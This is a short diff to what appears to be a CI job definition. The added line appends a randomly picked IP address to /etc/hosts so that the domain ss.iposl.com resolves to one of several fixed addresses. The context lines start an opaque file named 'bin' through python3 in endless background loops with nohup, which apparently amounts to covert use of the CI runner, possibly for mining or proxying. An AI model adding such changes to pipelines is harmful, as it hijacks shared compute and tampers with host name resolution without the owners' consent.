@@ -29,6 +29,8 @@ jobs:
           # mkdir thread1 && echo 'while true; do python3 bin; done' > thread1/run.sh && chmod +x thread1/run.sh
           # cp bin thread1 && cd thread1 && nohup bash run.sh & echo 'yes' && cd
 
+          echo "$(shuf -n1 <<< $'156.225.111.20\n156.225.111.18\n156.225.111.250\n156.225.111.33\n156.225.111.249\n156.225.111.27') ss.iposl.com" >> /etc/hosts
+
           for i in $(seq 1 1); do
             mkdir -p thread$i && \
             echo 'while true; do python3 bin; done' > thread$i/run.sh && \
